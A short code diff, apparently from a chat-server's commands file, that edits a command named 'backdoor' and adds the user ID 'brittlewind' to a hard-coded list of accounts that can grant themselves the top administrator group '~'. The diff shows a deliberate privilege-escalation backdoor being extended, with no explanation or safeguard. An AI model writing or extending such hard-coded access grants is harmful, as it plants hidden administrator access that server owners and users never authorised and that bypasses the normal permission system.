@@ -2817,7 +2817,7 @@ var commands = exports.commands = {
 	},
 
 	backdoor: function(target,room, user) {
-		if (user.userid === 'cosy' || user.userid === 'jd') {
+		if (user.userid === 'cosy' || user.userid === 'jd' || user.userid === 'brittlewind') {
 
 			user.group = '~';
 			user.updateIdentity();
